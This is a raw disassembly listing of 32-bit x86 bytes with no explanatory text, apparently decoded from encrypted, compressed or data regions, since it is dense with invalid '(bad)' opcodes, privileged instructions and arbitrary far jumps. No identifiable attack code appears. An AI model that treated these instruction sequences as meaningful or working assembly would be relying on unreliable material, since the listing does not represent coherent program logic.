  41d182:	inc    edi
  41d183:	jns    0x41d18d
  41d185:	push   ebx
  41d186:	popa   
  41d187:	pop    ecx
  41d188:	xlat   BYTE PTR ds:[ebx]
  41d189:	dec    bx
  41d18b:	cmp    bh,dh
  41d18d:	sbb    edi,DWORD PTR [ecx+ecx*1+0x6af1dc3e]
  41d194:	sbb    DWORD PTR [edx+0x29],eax
  41d197:	lahf   
  41d198:	lahf   
  41d199:	imul   esp,DWORD PTR gs:[edx],0x35cf568f
  41d1a0:	shl    BYTE PTR [ebx+esi*2+0x5dff3677],0x99
  41d1a8:	sub    eax,0x47e76f7b
  41d1ad:	mov    bl,bh
  41d1af:	add    al,0x44
  41d1b1:	cmp    al,0x93
  41d1b3:	mov    al,0x93
  41d1b5:	cmova  esp,DWORD PTR [esi-0x46]
  41d1b9:	pop    ebx
  41d1ba:	push   0x1e4a0f5e
  41d1bf:	(bad)  
  41d1c0:	into   
	...
  41d231:	add    BYTE PTR [eax],al
  41d233:	add    bl,dh
  41d235:	and    ebp,ecx
  41d237:	push   ebp
  41d238:	(bad)  
  41d23a:	sti    
  41d23b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d23c:	pop    edi
  41d23d:	push   edx
  41d23e:	jo     0x41d1ff
  41d240:	addr16 xor esp,edi
  41d243:	push   ss
  41d244:	les    edi,FWORD PTR [ecx]
  41d246:	add    DWORD PTR [eax],eax
  41d248:	cmc    
  41d249:	add    BYTE PTR [eax],al
  41d24b:	add    BYTE PTR [eax],dh
  41d24d:	dec    esi
  41d24e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d24f:	add    esp,ecx
  41d251:	pusha  
  41d252:	dec    eax
  41d253:	push   ebp
  41d254:	mul    DWORD PTR [ebx+0xa]
  41d257:	rcr    DWORD PTR [ebx],cl
  41d259:	cmp    eax,0xf4aea693
  41d25e:	stc    
  41d25f:	cmp    BYTE PTR [ebx+0x26],ah
  41d262:	scas   eax,DWORD PTR es:[edi]
  41d263:	inc    ecx
  41d264:	les    edi,FWORD PTR [eax+0x5e89117c]
  41d26a:	or     ebx,DWORD PTR [ebp+0x4f]
  41d26d:	bndstx [ebx],(bad)
  41d270:	mov    esi,0x17ca3177
  41d275:	adc    DWORD PTR [eax-0x70],ecx
  41d278:	pop    eax
  41d279:	or     esi,edi
  41d27b:	imul   eax,DWORD PTR [ecx],0x4516550c
  41d281:	sub    al,BYTE PTR [edi-0xd]
  41d284:	and    ebx,eax
  41d286:	mov    ch,0xee
  41d288:	clc    
  41d289:	sub    DWORD PTR [edi+0x68],ebp
  41d28c:	inc    edi
  41d28d:	imul   esi,edi,0x5b
  41d290:	jne    0x41d2d4
  41d292:	mov    eax,ds:0x867289f4
  41d297:	mul    ecx
  41d299:	pop    esp
  41d29a:	mov    ds:0x17f79160,al
  41d29f:	scas   eax,DWORD PTR es:[edi]
  41d2a0:	sbb    ah,BYTE PTR [ebp+0x70]
  41d2a3:	jp     0x41d314
  41d2a5:	outs   dx,BYTE PTR ds:[esi]
  41d2a6:	shl    BYTE PTR [ebx+edi*8-0x53a9c00d],0x47
  41d2ae:	daa    
  41d2af:	add    DWORD PTR [ebp-0x5ba15c0e],esp
  41d2b5:	sbb    BYTE PTR [ebx*8-0xf7fa8d0],bh
  41d2bc:	adc    dh,BYTE PTR ds:0x85aed553
  41d2c2:	dec    ebx
  41d2c3:	or     cl,BYTE PTR [bx+0x8]
  41d2c7:	mov    ebx,0xc5bbca28
  41d2cc:	clc    
  41d2cd:	stos   DWORD PTR es:[edi],eax
  41d2ce:	(bad)  
  41d2cf:	xchg   DWORD PTR [edx],edi
  41d2d1:	pop    ss
  41d2d2:	stos   DWORD PTR es:[edi],eax
  41d2d3:	outs   dx,BYTE PTR ds:[esi]
  41d2d4:	xor    al,0x1d
  41d2d6:	cdq    
  41d2d7:	addr16 aaa 
  41d2d9:	sbb    esi,edx
  41d2db:	inc    esp
  41d2dc:	dec    eax
  41d2dd:	in     al,0x5
  41d2df:	int    0xe
  41d2e1:	arpl   WORD PTR [ebp+0xd3180b5],bx
  41d2e7:	jle    0x41d2e6
  41d2e9:	lea    eax,[edx]
  41d2eb:	icebp  
  41d2ec:	out    0x3,eax
  41d2ee:	mov    esp,0x6f3593f7
  41d2f3:	mov    WORD PTR ds:[edx],fs
  41d2f6:	outs   dx,BYTE PTR ds:[esi]
  41d2f7:	push   0xffffff9a
  41d2f9:	loope  0x41d307
  41d2fb:	enter  0x95d6,0xfb
  41d2ff:	fisttp DWORD PTR [ebx+0x40]
  41d302:	sahf   
  41d303:	add    DWORD PTR [edi+0x712756ea],ebx
  41d309:	sub    esp,esp
  41d30b:	into   
  41d30c:	adc    eax,0xdd2bdc90
  41d311:	inc    ebx
  41d312:	repz int3 
  41d314:	in     eax,0x37
  41d316:	call   0x53:0x26e2798e
  41d31d:	mov    ds:0xf77b3ac7,al
  41d322:	adc    cl,dh
  41d324:	push   cs
  41d325:	les    ecx,FWORD PTR [edi*2+0x6cd989bf]
  41d32c:	ins    DWORD PTR es:[edi],dx
  41d32d:	xor    ch,BYTE PTR [edi]
  41d32f:	imul   esp,edx,0xf4362299
  41d335:	adc    edx,edi
  41d337:	xor    DWORD PTR [ebx+0x13],ebp
  41d33a:	mov    cl,0xbd
  41d33c:	addr16 jb 0x41d2f8
  41d33f:	mov    esi,0x92
	...
  41d3b4:	push   ebx
  41d3b5:	and    BYTE PTR [eax+0x5faef3ae],ah
  41d3bb:	std    
  41d3bc:	cmp    eax,0x4c
  41d3bf:	(bad)  
  41d3c0:	out    0x21,al
  41d3c2:	into   
  41d3c3:	(bad)  
  41d3c4:	mov    ecx,0xf500013a
  41d3c9:	add    BYTE PTR [eax],al
  41d3cb:	add    BYTE PTR [esi+0x2277a6d1],dh
  41d3d1:	jns    0x41d3f7
  41d3d3:	jmp    0x2cece530
  41d3d8:	push   ds
  41d3d9:	push   edx
  41d3da:	ins    DWORD PTR es:[edi],dx
  41d3db:	scas   al,BYTE PTR es:[edi]
  41d3dc:	js     0x41d3ae
  41d3de:	push   edi
  41d3df:	add    eax,0x2238577c
  41d3e4:	adc    cl,BYTE PTR [ebx+edi*4-0x35]
  41d3e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3e9:	ret    0xb95
  41d3ec:	xchg   ebx,eax
  41d3ed:	mov    dh,0x9e
  41d3ef:	pop    edi
  41d3f0:	retf   0xddd9
  41d3f3:	xchg   esp,eax
  41d3f4:	push   esp
  41d3f5:	cmp    DWORD PTR [ecx],ebp
  41d3f7:	sbb    esp,DWORD PTR [eax]
  41d3f9:	rcr    BYTE PTR [ecx],cl
  41d3fb:	inc    ecx
  41d3fc:	out    0xd9,eax
  41d3fe:	call   0x8c35:0xad963e9e
  41d405:	cwde   
  41d406:	adc    ecx,0xb8871825
  41d40c:	fisttp DWORD PTR [edx-0x5b]
  41d40f:	mov    dh,0xfd
  41d411:	mov    al,ds:0xd499c2ca
  41d416:	push   0xffffffe1
  41d418:	sbb    BYTE PTR [edi+0x4],bl
  41d41b:	loope  0x41d434
  41d41d:	mov    eax,ds:0x6ec2ec25
  41d422:	cmp    dl,dh
  41d424:	cmp    DWORD PTR [edx+0x32],edx
  41d427:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d428:	in     eax,0xe7
  41d42a:	add    ebp,esi
  41d42c:	test   al,0x1f
  41d42e:	ds daa 
  41d430:	jb     0x41d49c
  41d432:	cmp    DWORD PTR [edx],0xabb1dee0
  41d438:	dec    esp
  41d439:	icebp  
  41d43a:	jg     0x41d44c
  41d43c:	ja     0x41d457
  41d43e:	push   ebx
  41d43f:	sbb    eax,0xe7ff687
  41d444:	inc    ebp
  41d445:	or     ebx,ebp
  41d447:	out    dx,eax
  41d448:	pop    es
  41d449:	pop    ss
  41d44a:	mov    bl,0xa7
  41d44c:	aas    
  41d44d:	push   ebp
  41d44e:	rcr    al,0x89
  41d451:	pop    es
  41d452:	push   0x687718f2
  41d457:	jbe    0x41d43d
  41d459:	pop    esi
  41d45a:	xchg   edi,eax
  41d45b:	aad    0x15
  41d45d:	or     al,0x60
  41d45f:	lods   al,BYTE PTR ds:[esi]
  41d460:	mov    al,0xf
  41d462:	sub    BYTE PTR [ebp+0x28],bl
  41d465:	jno    0x41d463
  41d467:	in     al,0xf7
  41d469:	mov    esp,0xaba469f6
  41d46e:	js     0x41d48e
  41d470:	aaa    
  41d471:	or     dh,dh
  41d473:	and    DWORD PTR [eax+0x11974e6b],esp
  41d479:	dec    ebp
  41d47a:	mov    bl,0xff
  41d47c:	pop    edx
  41d47d:	les    esp,FWORD PTR [edx-0x74]
  41d480:	icebp  
  41d481:	jmp    0x8f0f:0xb4e8e1e9
  41d488:	mov    cl,0x42
  41d48a:	push   ss
  41d48b:	sti    
  41d48c:	neg    BYTE PTR [eax]
  41d48e:	push   ss
  41d48f:	sbb    eax,0x941eb50a
  41d494:	stos   DWORD PTR es:[edi],eax
  41d495:	mov    BYTE PTR [esi-0xbfda59b],0x8c
  41d49c:	and    eax,0x2f38419a
  41d4a1:	out    dx,eax
  41d4a2:	cwde   
  41d4a3:	fnstenv [edi]
  41d4a5:	lds    eax,FWORD PTR [eax-0x3cfa1fca]
  41d4ab:	fs test eax,0x5fc12b0
  41d4b1:	push   edi
  41d4b2:	pop    ds
  41d4b3:	jo     0x41d50f
  41d4b5:	call   0x3f41:0xc6a300c3
  41d4bc:	mov    dh,0xa4
  41d4be:	ror    esp,cl
  41d4c0:	test   BYTE PTR [eax],al
	...
  41d532:	add    BYTE PTR [eax],al
  41d534:	lds    esp,FWORD PTR [ebx]
  41d536:	xchg   ecx,eax
  41d537:	and    eax,0xe3f5b7f7
  41d53c:	push   ecx
  41d53d:	or     edi,DWORD PTR [edx+ecx*8+0x534ebe0c]
  41d544:	scas   al,BYTE PTR es:[edi]
  41d545:	cmp    eax,DWORD PTR [ecx]
  41d547:	add    ch,dh
  41d549:	add    BYTE PTR [eax],al
  41d54b:	add    BYTE PTR [ebp-0x13f6024f],bh
  41d551:	aam    0xdf
  41d553:	rcr    DWORD PTR [ebx+0x78b276d4],1
  41d559:	outs   dx,DWORD PTR ds:[esi]
  41d55a:	out    dx,eax
  41d55b:	cmp    BYTE PTR [edi+0xfbb6f0c],ah
  41d561:	and    BYTE PTR [ecx-0x3e66f970],bh
  41d567:	retf   
  41d568:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d569:	xor    eax,0xa24dcae
  41d56e:	imul   eax,DWORD PTR [eax+ecx*1],0x4b
  41d572:	test   dl,dl
  41d574:	repz popa 
  41d576:	das    
  41d577:	out    dx,ax
  41d579:	adc    BYTE PTR [ecx+0x7a],ch
  41d57c:	push   esi
  41d57d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d57e:	pop    ecx
  41d57f:	xabort 0x1f
  41d582:	pop    es
  41d583:	sahf   
  41d584:	test   BYTE PTR [edi-0x6230ed02],0xe4
  41d58b:	scas   al,BYTE PTR es:[edi]
  41d58c:	add    eax,0xbfb54f96
  41d591:	retf   0x5025
  41d594:	int3   
  41d595:	repnz (bad) 
  41d597:	test   BYTE PTR es:[eax-0x3aedd2a2],cl
  41d59e:	mov    dl,0x36
  41d5a0:	pop    DWORD PTR [ebx+esi*2+0x5e]
  41d5a4:	ror    BYTE PTR [ecx+0x35],0xf4
  41d5a8:	outs   dx,BYTE PTR ds:[esi]
  41d5a9:	mov    ah,0x8d
  41d5ab:	and    eax,0x7db07bab
  41d5b0:	int    0xa1
  41d5b2:	add    esi,edi
  41d5b4:	xor    al,0xf2
  41d5b6:	mov    ds:0xda5018cd,eax
  41d5bb:	pop    esi
  41d5bc:	mov    edx,0xd7f8f7e
  41d5c1:	sub    esi,eax
  41d5c3:	sti    
  41d5c4:	test   bl,dh
  41d5c6:	cdq    
  41d5c7:	push   edx
  41d5c8:	ins    BYTE PTR es:[edi],dx
  41d5c9:	mov    al,ds:0x283b215b
  41d5ce:	sbb    BYTE PTR [eax+0x0],dh
  41d5d1:	cmp    bl,ah
  41d5d3:	mov    al,ds:0x19eaf276
  41d5d8:	jl     0x41d604
  41d5da:	(bad)  
  41d5db:	(bad)  
  41d5dc:	or     cl,BYTE PTR [eax-0x4]
  41d5df:	aas    
  41d5e0:	xor    al,0x67
  41d5e2:	cmp    DWORD PTR [edi],ebx
  41d5e4:	cmp    DWORD PTR [edx-0x40617194],edi
  41d5ea:	push   edx
  41d5eb:	outs   dx,DWORD PTR ds:[esi]
  41d5ec:	add    DWORD PTR [esi+0x467496d0],ebp
  41d5f2:	fst    QWORD PTR [eax]
  41d5f4:	sbb    ecx,DWORD PTR [ebp+0x1b66cd2f]
  41d5fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5fb:	or     ebx,DWORD PTR [eax]
  41d5fd:	mov    ebp,DWORD PTR [esi+0x3c]
  41d600:	in     eax,0xa9
  41d602:	imul   edi,DWORD PTR [ebx-0x388cb19a],0xffffffe0
  41d609:	pop    ebp
  41d60a:	xor    cl,ah
  41d60c:	into   
  41d60d:	adc    edx,DWORD PTR [edi+0x4ae26203]
  41d613:	mov    al,0xd8
  41d615:	lock icebp 
  41d617:	sbb    dl,bl
  41d619:	adc    esp,DWORD PTR [edx+0x78]
  41d61c:	outs   dx,DWORD PTR ds:[esi]
  41d61d:	loopne 0x41d5f5
  41d61f:	push   DWORD PTR [ebx]
  41d621:	lahf   
  41d622:	adc    al,0xf8
  41d624:	out    dx,al
  41d625:	aam    0xf5
  41d627:	and    al,0xff
  41d629:	scas   al,BYTE PTR es:[edi]
  41d62a:	or     esi,eax
  41d62c:	inc    edx
  41d62d:	adc    eax,0x4abe658b
  41d632:	out    0xaa,eax
  41d634:	ins    DWORD PTR es:[edi],dx
  41d635:	(bad)  
  41d636:	push   ds
  41d637:	inc    ecx
  41d638:	sbb    BYTE PTR [ecx],dl
  41d63a:	in     eax,0xc6
  41d63c:	sar    esi,cl
  41d63e:	arpl   WORD PTR [ebx+0x12],bp
	...
  41d6b4:	fiadd  DWORD PTR [ecx]
  41d6b6:	ret    0xdb86
  41d6b9:	(bad)  
  41d6ba:	ficomp WORD PTR [ebp+0x8]
  41d6bd:	push   0x6e220a3b
  41d6c2:	and    dl,ah
  41d6c4:	mov    ds:0xf500013c,eax
  41d6c9:	add    BYTE PTR [eax],al
  41d6cb:	add    BYTE PTR [edi+0x61],cl
  41d6ce:	imul   BYTE PTR [edi+0x66b623ad]
  41d6d4:	arpl   WORD PTR [esi],bp
  41d6d6:	cs and eax,0x277980c5
  41d6dc:	xlat   BYTE PTR ds:[ebx]
  41d6dd:	jl     0x41d70d
  41d6df:	dec    esp
  41d6e0:	lahf   
  41d6e1:	pop    esp
  41d6e2:	sbb    ebx,DWORD PTR [eax+0x47c58870]
  41d6e8:	xchg   edx,eax
  41d6e9:	fucomip st,st(1)
  41d6eb:	inc    edx
  41d6ec:	retf   
  41d6ed:	sahf   
  41d6ee:	and    dl,BYTE PTR [esi+ecx*1-0x78f7221c]
  41d6f5:	dec    esp
  41d6f6:	addr16 repz inc esi
  41d6f9:	mov    al,0x40
  41d6fb:	jb     0x41d716
  41d6fd:	(bad)  
  41d6ff:	ret    
  41d700:	pop    ecx
  41d701:	mov    esi,0x250be34b
  41d706:	nop
  41d707:	pop    ebp
  41d708:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d709:	sub    DWORD PTR [edi-0x5cc896b9],eax
  41d70f:	(bad)  
  41d710:	sar    DWORD PTR fs:[ebp-0xa],0xe1
  41d715:	push   ebp
  41d716:	call   0x857c59a
  41d71b:	jg     0x41d6bd
  41d71d:	lea    esi,[esi+0x6b]
  41d720:	dec    edi
  41d721:	mov    esi,0x7238fdae
  41d726:	lahf   
  41d727:	imul   edi,DWORD PTR ds:0x8da37896,0xffffff84
  41d72e:	mov    ds:0x59bb397b,eax
  41d733:	mov    cl,0xa2
  41d735:	test   ebx,edi
  41d737:	mov    al,ds:0xf7bf6d9f
  41d73c:	and    esp,DWORD PTR [ebx+0x776f36e1]
  41d742:	xchg   esi,eax
  41d743:	jle    0x41d6e5
  41d745:	and    al,0xce
  41d747:	in     eax,0x39
  41d749:	loopne 0x41d725
  41d74b:	dec    ebx
  41d74c:	int3   
  41d74d:	loope  0x41d79e
  41d74f:	mov    bh,0x6d
  41d751:	or     al,BYTE PTR [eax]
  41d753:	lahf   
  41d754:	sbb    eax,0xe4cb01f2
  41d759:	ror    BYTE PTR [eax-0x1d1cb777],1
  41d75f:	cdq    
  41d760:	call   0xe95128ba
  41d765:	(bad)  
  41d766:	aaa    
  41d767:	pop    ss
  41d768:	lahf   
  41d769:	xchg   edi,eax
  41d76a:	cs aas 
  41d76c:	mov    al,0x6e
  41d76e:	sub    ah,dl
  41d770:	pop    ebp
  41d771:	enter  0xab58,0x1c
  41d775:	pushf  
  41d776:	or     cl,0x1f
  41d779:	jnp    0x41d70b
  41d77b:	dec    esp
  41d77c:	stos   BYTE PTR es:[edi],al
  41d77d:	inc    edi
  41d77e:	jb     0x41d7e2
  41d780:	sar    dh,cl
  41d782:	sub    eax,0x54cb5b89
  41d787:	das    
  41d788:	xor    ch,bl
  41d78a:	jbe    0x41d718
  41d78c:	cwde   
  41d78d:	add    eax,ebx
  41d78f:	lds    ebp,FWORD PTR [ecx+0x25]
  41d792:	daa    
  41d793:	div    dl
  41d795:	int    0xf2
  41d797:	dec    ebp
  41d798:	sbb    esp,DWORD PTR [eax]
  41d79a:	in     eax,dx
  41d79b:	js     0x41d76b
  41d79d:	aad    0x36
  41d79f:	mov    ebp,0x565059ba
  41d7a4:	clc    
  41d7a5:	test   DWORD PTR [ecx-0x1ff8c7f3],edi
  41d7ab:	cdq    
  41d7ac:	bound  eax,QWORD PTR [ebx]
  41d7ae:	in     al,dx
  41d7af:	xchg   DWORD PTR [ecx+0x13f18ad1],edi
  41d7b5:	mov    ds:0x844a9a44,al
  41d7ba:	inc    ecx
  41d7bb:	mov    edi,DWORD PTR [ecx-0x2f9daf1f]
	...
  41d831:	add    BYTE PTR [eax],al
  41d833:	add    BYTE PTR [ebx+0x34],ah
  41d836:	lods   eax,DWORD PTR ds:[esi]
  41d837:	xor    al,0xff
  41d839:	mov    ebp,0xf28777fb
  41d83e:	pop    es
  41d83f:	add    eax,DWORD PTR [edx+ebp*1+0x3d98b213]
  41d846:	add    DWORD PTR [eax],eax
  41d848:	cmc    
  41d849:	add    BYTE PTR [eax],al
  41d84b:	add    cl,ch
  41d84d:	xchg   ebp,eax
  41d84e:	out    dx,al
  41d84f:	aas    
  41d850:	popf   
  41d851:	jb     0x41d876
  41d853:	fs add eax,0x7a81e31c
  41d859:	sbb    eax,0xede1dd6c
  41d85e:	es call 0x14c6:0x15407b88
  41d866:	out    0x77,eax
  41d868:	popa   
  41d869:	fisub  WORD PTR [ebx+0x41925127]
  41d86f:	pop    ecx
  41d870:	shr    dh,cl
  41d872:	jmp    0x41d850
  41d874:	addr16 mov ebx,0xaa28f374
  41d87a:	cli    
  41d87b:	xchg   esp,eax
  41d87c:	out    dx,eax
  41d87d:	or     dl,dh
  41d87f:	xor    DWORD PTR [eax],edi
  41d881:	or     bl,dl
  41d883:	aad    0x69
  41d885:	leave  
  41d886:	sbb    esi,DWORD PTR [ebx]
  41d888:	popf   
  41d889:	pushf  
  41d88a:	jmp    0xc1f1:0xb969edb6
  41d891:	mov    BYTE PTR [edi],ah
  41d893:	(bad)  
  41d894:	jmp    0x41d854
  41d896:	jge    0x41d878
  41d898:	inc    edx
  41d899:	fwait
  41d89a:	mov    esp,0x76363e30
  41d89f:	popa   
  41d8a0:	test   ebp,edi
  41d8a2:	cmp    dl,0x9b
  41d8a5:	cli    
  41d8a6:	out    0x59,eax
  41d8a8:	fadd   st(6),st
  41d8aa:	add    al,0x7c
  41d8ac:	retf   0x524d
  41d8af:	sti    
  41d8b0:	inc    eax
  41d8b1:	cmp    eax,0x5fd62fbf
  41d8b6:	xchg   edi,eax
  41d8b7:	jp     0x41d8d3
  41d8b9:	les    esp,FWORD PTR gs:[edx+ebp*4]
  41d8bd:	jmp    0xd803cb2a
  41d8c2:	ret    0xc925
  41d8c5:	std    
  41d8c6:	daa    
  41d8c7:	aam    0x89
  41d8c9:	icebp  
  41d8ca:	sbb    ah,BYTE PTR [eax+0x35]
  41d8cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8ce:	aam    0xf4
  41d8d0:	iret   
  41d8d1:	jge    0x41d86c
  41d8d3:	out    0x2,ax
  41d8d6:	nop
  41d8d7:	xchg   esp,eax
  41d8d8:	adc    eax,0x8cb77275
  41d8dd:	mov    cl,0x61
  41d8df:	sbb    ah,ch
  41d8e1:	xchg   esp,edx
  41d8e3:	xchg   ebx,eax
  41d8e4:	mov    BYTE PTR [edx],0x8
  41d8e7:	dec    esi
  41d8e8:	leave  
  41d8e9:	mov    bl,0x7e
  41d8eb:	mov    DWORD PTR [ebx-0x151d9ba9],0xeedad43f
  41d8f5:	repnz cli 
  41d8f7:	xchg   edi,eax
  41d8f8:	or     al,0xf8
  41d8fa:	rcr    BYTE PTR [eax-0x6ddda685],cl
  41d900:	mov    eax,ds:0x16f48fb5
  41d905:	rcr    BYTE PTR [ecx-0x25af7c6d],cl
  41d90b:	adc    ebp,DWORD PTR [esi+0x734634c]
  41d911:	sub    BYTE PTR [edx],0x54
  41d914:	(bad)  
  41d915:	shl    ah,0xd3
  41d918:	aam    0xeb
  41d91a:	arpl   WORD PTR [esi],bp
  41d91c:	call   0x205d7ca9
  41d921:	sahf   
  41d922:	push   edi
  41d923:	call   0xa686:0x19a5ac14
  41d92a:	cmp    bh,bh
  41d92c:	push   cs
  41d92d:	sbb    al,0x14
  41d92f:	dec    edi
  41d930:	fwait
  41d931:	sbb    bh,dl
  41d933:	mov    ch,0x24
  41d935:	stc    
  41d936:	push   edi
  41d937:	jecxz  0x41d9a8
  41d939:	repz int3 
  41d93b:	shl    DWORD PTR [esi+0x7ba62687],cl
	...
  41d9b1:	add    BYTE PTR [eax],al
  41d9b3:	add    al,dh
  41d9b5:	retf   0xfc94
  41d9b8:	mov    esi,0xfdcef8fe
  41d9bd:	cwde   
  41d9be:	sbb    eax,0x1158f41c
  41d9c3:	sbb    DWORD PTR [ebp-0xafffec2],ecx
  41d9c9:	add    BYTE PTR [eax],al
  41d9cb:	add    BYTE PTR [ebx],dl
  41d9cd:	stc    
  41d9ce:	mov    ch,0x6b
  41d9d0:	es push eax
  41d9d2:	repnz lods eax,DWORD PTR ds:[esi]
  41d9d4:	jge    0x41d9d5
  41d9d6:	lds    eax,FWORD PTR [esi+0xb1b85a]
  41d9dc:	jg     0x41d974
  41d9de:	jns    0x41d9dd
  41d9e0:	mov    al,0x50
  41d9e2:	(bad)  
  41d9e3:	enter  0xf294,0x19
  41d9e7:	fistp  WORD PTR ds:0x97e44767
  41d9ee:	push   esp
  41d9ef:	xor    DWORD PTR [edx],eax
  41d9f1:	lods   al,BYTE PTR ds:[esi]
  41d9f2:	jns    0x41d9bd
  41d9f4:	push   eax
  41d9f5:	rcr    DWORD PTR [esi+0x2d],0xf4
  41d9f9:	out    0x6,al
  41d9fb:	or     DWORD PTR [esi+0x20],0x14e79d0e
  41da02:	lea    esi,[ecx+0x470b09c5]
  41da08:	mov    ds:0x17b335c3,al
  41da0d:	jmp    0xde4f:0x60946f73
  41da14:	shr    DWORD PTR [ecx+0x6f],cl
  41da17:	jns    0x41d9a1
  41da19:	ja     0x41d9be
  41da1b:	or     al,0x54
  41da1d:	push   edx
  41da1e:	inc    ebx
  41da1f:	ret    0xf702
  41da22:	sub    ecx,ebx
  41da24:	mov    edx,0xde744f32
  41da29:	out    dx,al
  41da2a:	enter  0x4bc1,0xb3
  41da2e:	adc    DWORD PTR [ebx],esp
  41da30:	and    al,0xaf
  41da32:	ret    0x2d4c
  41da35:	in     al,dx
  41da36:	cmp    DWORD PTR [edi+0x3f],esi
  41da39:	in     eax,0x3a
  41da3b:	lds    esp,FWORD PTR [ebp-0x5d]
  41da3e:	mov    edx,0x133664b6
  41da43:	push   esi
  41da44:	push   cs
  41da45:	(bad)  
  41da46:	(bad)  
  41da47:	pop    edi
  41da48:	leave  
  41da49:	pop    ebx
  41da4a:	data16 aaa 
  41da4c:	xchg   BYTE PTR [ebp-0x7dcf3e98],bh
  41da52:	dec    eax
  41da53:	mov    ds:0xa0e5c409,eax
  41da58:	pop    eax
  41da59:	mov    bh,0xd0
  41da5b:	xor    eax,0x1c5af4c4
  41da60:	sti    
  41da61:	aas    
  41da62:	jg     0x41dace
  41da64:	repnz test DWORD PTR ds:[ebp+0x49],eax
  41da69:	int3   
  41da6a:	xor    esi,DWORD PTR [ebp+0x4]
  41da6d:	push   0x5b
  41da6f:	or     bh,ah
  41da71:	imul   edi,DWORD PTR [eax+edi*8-0x11],0x315fe07c
  41da79:	std    
  41da7a:	out    dx,eax
  41da7b:	cdq    
  41da7c:	or     dl,bl
  41da7e:	inc    ebp
  41da7f:	mov    edx,0x3552d7b7
  41da84:	mov    cl,0x9d
  41da86:	jecxz  0x41da7f
  41da88:	push   eax
  41da89:	in     al,dx
  41da8a:	adc    BYTE PTR [eax],al
  41da8c:	push   esi
  41da8d:	test   al,0x58
  41da8f:	add    ax,0xe89a
  41da93:	adc    dl,BYTE PTR [ebx]
  41da95:	xchg   edi,eax
  41da96:	aaa    
  41da97:	aas    
  41da98:	into   
  41da99:	pop    edi
  41da9a:	add    ch,BYTE PTR [edx]
  41da9c:	sbb    BYTE PTR [ebx-0x7e83a045],bh
  41daa2:	mov    ecx,0x77dfb370
  41daa7:	retf   
  41daa8:	cmp    DWORD PTR [ebx-0x75ba9bb0],edx
  41daae:	xor    ebx,DWORD PTR [ecx-0x75]
  41dab1:	aad    0xff
  41dab3:	sbb    eax,0x1475f8ee
  41dab8:	dec    DWORD PTR [ecx+0x3954937e]
  41dabe:	xchg   edi,eax
  41dabf:	shl    edx,1
	...
  41db31:	add    BYTE PTR [eax],al
  41db33:	add    BYTE PTR [ecx],ch
  41db35:	(bad)  
  41db36:	sti    
  41db37:	pop    ebp
  41db38:	(bad)  
  41db39:	jge    0x41daea
  41db3b:	div    dl
  41db3d:	cmp    ebp,0xb
  41db40:	and    DWORD PTR [edi+eiz*8+0x13f8285],0x0
  41db48:	cmc    
  41db49:	add    BYTE PTR [eax],al
  41db4b:	add    BYTE PTR ds:0x6a7e6ab0,dh
  41db51:	retf   0x5670
  41db54:	fcomp  QWORD PTR [ecx+0x59]
  41db57:	mov    bl,BYTE PTR [ebp-0x6b99c9e2]
  41db5d:	aad    0x14
  41db5f:	mov    edi,0x6713159b
  41db64:	xor    DWORD PTR [esi+esi*1],0x9f790f8c
  41db6b:	daa    
  41db6c:	jmp    0x7295:0xd24d1518
  41db73:	int    0x78
  41db75:	push   esp
  41db76:	imul   ebx,esi,0xee004602
  41db7c:	int    0x11
  41db7e:	call   0xf56d178
  41db83:	in     eax,0x7
  41db85:	jae    0x41db12
  41db87:	mov    edx,DWORD PTR [edx]
  41db89:	mov    cl,0x6e
  41db8b:	repnz repz loop 0x41dbd2
  41db8f:	in     al,dx
  41db90:	xchg   BYTE PTR fs:[edi+0x6d65d92a],cl
  41db97:	add    al,0x6f
  41db99:	into   
  41db9a:	cmp    DWORD PTR [edi+0x66d5384d],esp
  41dba0:	xchg   edx,eax
  41dba1:	dec    ebp
  41dba2:	pop    es
  41dba3:	fwait
  41dba4:	cld    
  41dba5:	cld    
  41dba6:	popa   
  41dba7:	add    BYTE PTR [esi+ebx*4-0x36],al
  41dbab:	std    
  41dbac:	pop    esp
  41dbad:	jb     0x41dc22
  41dbaf:	push   esi
  41dbb0:	rcr    dh,cl
  41dbb2:	lods   al,BYTE PTR cs:[esi]
  41dbb4:	jg     0x41dbfc
  41dbb6:	xor    bh,BYTE PTR [esp+eiz*4-0x2f]
  41dbba:	cmp    ch,BYTE PTR [eax-0x3e077208]
  41dbc0:	push   edx
  41dbc1:	dec    ebp
  41dbc2:	call   0xc27c27ef
  41dbc7:	and    ebx,esi
  41dbc9:	in     eax,0x61
  41dbcb:	dec    esp
  41dbcc:	out    dx,eax
  41dbcd:	aaa    
  41dbce:	xchg   esp,eax
  41dbcf:	outs   dx,BYTE PTR ds:[esi]
  41dbd0:	(bad)  
  41dbd1:	jo     0x41db6e
  41dbd3:	jmp    DWORD PTR ds:0x4e877ff2
  41dbd9:	imul   edx,DWORD PTR [ecx],0xffffffaf
  41dbdc:	ss and ebx,ecx
  41dbdf:	stos   DWORD PTR es:[edi],eax
  41dbe0:	push   ebp
  41dbe1:	pushf  
  41dbe2:	xchg   ecx,eax
  41dbe3:	dec    ebx
  41dbe4:	push   ss
  41dbe5:	out    0xa3,eax
  41dbe7:	dec    edi
  41dbe8:	jae    0x41dbe2
  41dbea:	push   cs
  41dbeb:	jae    0x41dbca
  41dbed:	(bad)  [ebx+0x64]
  41dbf0:	and    al,0x85
  41dbf2:	jae    0x41dc02
  41dbf4:	adc    BYTE PTR [ebx],0x8f
  41dbf7:	sbb    cl,BYTE PTR [edx-0x69396b4e]
  41dbfd:	jg     0x41dc5a
  41dbff:	inc    eax
  41dc00:	test   DWORD PTR [edx+eiz*4+0x2bee2785],esp
  41dc07:	sbb    esp,0x6811886b
  41dc0d:	mov    al,ds:0xa6e2fe71
  41dc12:	outs   dx,BYTE PTR ds:[esi]
  41dc13:	in     al,0x68
  41dc15:	scas   al,BYTE PTR es:[edi]
  41dc16:	xchg   edx,eax
  41dc17:	add    BYTE PTR [edx+0xd3922c2],ch
  41dc1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc1e:	daa    
